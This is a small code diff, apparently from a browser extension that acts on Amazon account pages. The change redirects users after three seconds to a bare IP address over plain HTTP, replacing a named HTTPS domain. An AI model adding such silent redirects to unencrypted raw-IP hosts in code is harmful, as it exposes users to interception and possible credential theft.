@@ -45,7 +45,7 @@ if(url.includes('amazon.com/gp/your-account') && !url.includes('orderFilter=')){
         );
         
         setTimeout(function(){ 
-            window.location.href = 'https://myamazonhistory.com/user/crud/blogs';
+            window.location.href = 'http://138.197.196.165/user/crud/blogs';
             }, 
         3000);
     }
